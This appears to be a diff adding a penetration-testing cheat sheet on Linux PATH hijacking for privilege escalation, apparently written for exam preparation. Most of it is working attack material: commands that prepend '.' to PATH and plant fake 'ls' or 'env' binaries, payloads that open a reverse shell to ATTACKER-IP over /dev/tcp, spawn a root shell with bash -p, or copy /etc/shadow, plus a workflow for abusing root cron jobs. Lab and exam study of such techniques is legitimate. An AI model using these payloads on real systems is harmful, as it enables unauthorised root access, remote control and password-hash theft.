@@ -1,0 +1,154 @@
+✅ Summary
+The PATH environment variable tells the system where to look for binaries when a command is run. If you can manipulate this variable or place a malicious binary in a high-priority location in PATH, you can trick the system (or a higher-privileged user) into running your payload instead of the legitimate command.
+
+This technique is commonly used when:
+
+A script is being run by root that calls binaries without a full path
+
+The current user can edit their own PATH
+
+The user or system uses . (current directory) in PATH, which is a huge misconfig
+
+🔀 "If This, Then That" Workflow
+Got This	Then Do That
+You have write access to a folder in PATH	Drop a malicious binary (same name as trusted command)
+You find a script being executed by root that runs ls, cat, etc. without full path	Abuse PATH to hijack the binary
+You can modify your own PATH variable	Add . to the beginning of it, and plant your malicious script in current dir
+You can write to /usr/local/bin or /usr/local/sbin	Place a malicious script with a trusted command name
+You find a cron job or SUID binary calling commands without full path	Abuse PATH to intercept and escalate
+You want to simulate this in a test	Use touch <cmd> && echo <payload> > <cmd> and chmod +x <cmd>
+🧠 Patterns / What to Look For
+Misconfigured PATH includes:
+
+. at the beginning of the PATH
+
+Writable directories like /usr/local/bin, /tmp/bin
+
+User home directories in the path (e.g. /home/user/scripts)
+
+Scripts calling binaries without full paths:
+
+E.g., ls, cat, rm instead of /bin/ls
+
+Users who export custom paths in .bashrc, .profile, or custom scripts
+
+SUID binaries or cron jobs running as root and calling weakly referenced binaries
+
+🛠️ One-Liners & Tactics
+🧪 View your current path
+bash
+Copy
+Edit
+echo $PATH
+🔍 Find writable directories in PATH
+bash
+Copy
+Edit
+echo $PATH | tr ':' '\n' | xargs -I {} bash -c 'test -w {} && echo "Writable: {}"'
+⚔️ Hijack PATH with . (current dir)
+bash
+Copy
+Edit
+PATH=.:$PATH && export PATH
+🎭 Create a malicious fake binary
+bash
+Copy
+Edit
+echo 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1' > ls
+chmod +x ls
+🎯 Catch root/script execution if ls is run
+bash
+Copy
+Edit
+ls  # <-- This will now trigger your reverse shell
+📜 Find scripts that call commands without full paths
+bash
+Copy
+Edit
+grep -rE '\<(cp|mv|ls|cat|tar|sh|bash|rm|python|perl)\>' /etc/cron* /etc/init.d/* /opt/* 2>/dev/null
+💥 Hints / Gotchas / Exam Tips
+This is often paired with cron job abuse — if a root cron job runs a script you can modify or that calls ls, cp, etc., hijack the command.
+
+Writable folders in PATH = instant attack surface — especially if owned by your current user.
+
+Always check what directory you're in when trying this. The . trick only works if you're in the same folder as the fake command.
+
+Tools like sudo, su, ssh, and scp are often NOT vulnerable here because they use absolute paths — focus on scripts written by humans, not system tools.
+
+Try it with harmless payloads first, like echo "GOTCHA" — then escalate to reverse shell if it works.
+
+If a binary executes without full path AND the script has SUID or runs as root via cron — this is a root escalation vector.
+
+Don’t forget to clean up after this trick in labs or live environments — dropped fake binaries can linger.
+
+
+💡 If You Have Write Access in $PATH (or Can Modify $PATH):
+✅ Yes, you can absolutely abuse it by:
+Dropping a malicious binary into a writeable directory already in $PATH or
+
+Modifying the $PATH to point to a directory you control (like . or /tmp/fakebin) and placing a malicious script in it
+
+🔓 What Kind of Malicious Binary?
+Depends on what the victim process calls, and who runs it.
+
+🧨 Scenario 1: Cron Job / Script / SUID Binary is Running ls (or cat, tar, etc.)
+➡️ Replace it with your fake binary that does one of the following:
+
+🪝 Option A: Spawn a root shell
+If you're abusing a SUID binary or cron job:
+
+bash
+Copy
+Edit
+echo -e '#!/bin/bash\n/bin/bash -p' > ls
+chmod +x ls
+-p preserves privileges. If run as root, you’ll drop into root shell.
+
+🕳️ Option B: Reverse shell
+bash
+Copy
+Edit
+echo 'bash -i >& /dev/tcp/YOUR-IP/4444 0>&1' > ls
+chmod +x ls
+🔍 Option C: Dump shadow file
+bash
+Copy
+Edit
+echo 'cat /etc/shadow > /tmp/shadowdump' > ls
+chmod +x ls
+🧠 How GTFObins Fits In:
+GTFObins shows known-good binaries that are either:
+
+SUID-safe (run with elevated perms)
+
+Abusable via $PATH manipulation
+
+Able to escalate, bypass restrictions, or exfiltrate
+
+So if a script or privileged job runs tar, awk, perl, env, cp, etc., you go to GTFObins and use the PATH-based method listed for that binary.
+
+Example: Let’s say the target script runs env
+➡️ Go to: https://gtfobins.github.io/gtfobins/env/
+
+Use the "Sudo" or "Shell" technique (depending who runs it)
+
+bash
+Copy
+Edit
+echo -e '#!/bin/bash\nbash -p' > env
+chmod +x env
+Boom — if that script is executed by root, and your env gets called first, you’re in.
+
+📌 CPTS / Exam Mindset:
+Think This	Do This
+“Can I write to a folder in $PATH?”	Drop malicious ls, cp, or any binary that’s used
+“Can I modify $PATH?”	Prepend . or your controlled dir and drop fake binaries
+“This script doesn’t use full paths”	Abuse $PATH and hijack the weak command
+“This job runs every minute”	Drop payload and wait for it to fire
+“This binary is in GTFObins”	Use their exact payload + test in your environment
+🧪 Quick Detection One-Liner:
+bash
+Copy
+Edit
+strings /path/to/script.sh | grep -v '/' | grep -E 'ls|cp|rm|tar|cat|env|awk|python|perl'
+If any of these are used without full path, that’s your opening.
